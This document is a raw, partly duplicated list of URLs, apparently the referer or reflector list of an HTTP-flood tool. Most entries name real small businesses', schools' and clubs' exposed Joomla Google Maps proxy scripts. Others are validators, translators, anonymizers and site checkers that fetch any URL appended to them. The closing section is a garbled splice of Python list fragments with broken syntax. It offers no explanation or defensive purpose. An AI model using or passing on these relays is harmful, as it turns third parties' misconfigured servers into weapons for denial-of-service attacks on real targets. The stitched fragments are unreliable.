http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=
http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=
http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt
http://web-sniffer.net/?url=
http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=
http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=
http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=
http://translate.yandex.net/tr-url/ru-uk.uk/
http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=
http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=
http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=
http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=
http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=
http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS
http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=
http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=
http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=
http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=
http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=
http://validator.w3.org/nu/?doc=
http://check-host.net/check-http?host=
http://www.netvibes.com/subscribe.php?url=
http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.google.com/ig/add?feedurl=
http://anonymouse.org/cgi-bin/anon-www.cgi/
http://www.google.com/translate?u=
http://translate.google.com/translate?u=
http://validator.w3.org/feed/check.cgi?url=
http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=
http://validator.w3.org/check?uri=
http://jigsaw.w3.org/css-validator/validator?uri=
http://validator.w3.org/checklink?uri=
http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=
http://www.w3.org/RDF/Validator/ARPServlet?URI=
http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=
http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=
http://www.w3.org/services/tidy?docAddr=
http://validator.w3.org/mobile/check?docAddr=
http://validator.w3.org/p3p/20020128/p3p.pl?uri=
http://validator.w3.org/p3p/20020128/policy.pl?uri=
http://online.htmlvalidator.com/php/onlinevallite.php?url=
http://feedvalidator.org/check.cgi?url=
http://gmodules.com/ig/creator?url=
http://www.google.com/ig/adde?moduleurl=
http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=
http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=
http://host-tracker.com/check_page/?furl=
http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=
http://www.viewdns.info/ismysitedown/?domain=
http://www.onlinewebcheck.com/check.php?url=
http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=
http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=
http://about42.nl/www/showheaders.php;POST;about42.nl.txt
http://browsershots.org;POST;browsershots.org.txt
http://streamitwebseries.twww.tv/proxy.php?url=
http://www.comicgeekspeak.com/proxy.php?url=
http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=
http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=
http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=
http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=
http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=
http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=
http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=
http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=
http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=
http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=
http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=
http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=,
http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=,,
http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=,
http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt,
http://web-sniffer.net/?url=,
http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=,
http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=,
http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=,
http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=,
http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=,
http://translate.yandex.net/tr-url/ru-uk.uk/,
http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=,
http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=,
http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=,
http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=,
http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=,
http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=,
http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS""",
    'http://www.bing.com/search?q=',
        "http://host-tracker.com/check_page/?url="
        "http://jigsaw.w3.org/css-validator/validator?url="
        "http://www.google.com/translate?u="
        "http://anonymouse.org/cgi-bin/anon-www.cgi/"
        "http://www.onlinewebcheck.com/?url="
        "http://feedvalidator.org/check.cgi?url="
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL="
        "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL="
      'http://www.bus-reicherteu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
      'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
      'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
      'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
        "http://validator.w3.org/feed/check.cgi?url="
        "http://www.pagescoring.com/website-speed-test/?url="
        "http://check-host.net/check-http?host="
        "http://checksite.us/?url="
        "http://jobs.bloomberg.com/search?q="
        "http://www.bing.com/search?q="
        "https://www.yandex.com/yandsearch?text="
        "http://www.google.com/?q="
        "https://add.my.yahoo.com/rss?url="
        "http://www.bestbuytheater.com/events/search?q="
        "http://www.shodanhq.com/search?q="
        "https://play.google.com/store/search?q="
        "http://coccoc.com/search#query="
        "http://www.search.com/search?q="
        "https://add.my.yahoo.com/rss?url="
        "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url="
        "https://www.facebook.com/l.php?u=",
        "https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "http://downforeveryoneorjustme.com/",
        "http://www.slickvpn.com/go-dark/browse.php?u=",
        "https://www.megaproxy.com/go/_mp_framed?",
        "http://scanurl.net/?u=",
        "http://www.isup.me/",
        "http://www.currentlydown.com/",
        "http://check-host.net/check-ping?host=",
        "http://check-host.net/check-tcp?host=",
        "http://check-host.net/check-dns?host=",
        "http://check-host.net/ip-info?host=",
        "https://safeweb.norton.com/report/show?url=",
        "http://www.webproxy.net/view?q=",
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
        "https://anonysurfer.com/a2/index.php?q=",
        "http://analiz.web.tr/en/www/",
    'http://www.alltheweb.com/help/webmaster/crawler',
    'http://gais.cs.ccu.edu.tw/robot.php', 'http://www.googlebot.com/bot.html',
    'https://www.yandex.com/yandsearch?text=', 'https://duckduckgo.com/?q=',
    'http://www.ask.com/web?q=', 'https://www.fbi.com/',
    'http://search.aol.com/aol/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://drive.google.com/viewerng/viewer?url=',
    'http://www.google.com/translate?u=',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://replit.com/', 'https://check-host.net/', 'https://obaspro.my.id/',
    'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
    'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
    'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url='
    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
    'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
    'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
    'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url='
    'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
    'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
    'http://growtopiagame.com/', 'http://check-host.net/check-http?url=',
    'http://ip2location.com/', 'https://pointblank.com/',
    'https://www.ted.com/search?q=',
    'https://drive.google.com/viewerng/viewer?url=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://host-tracker.com/check_page/?furl=',
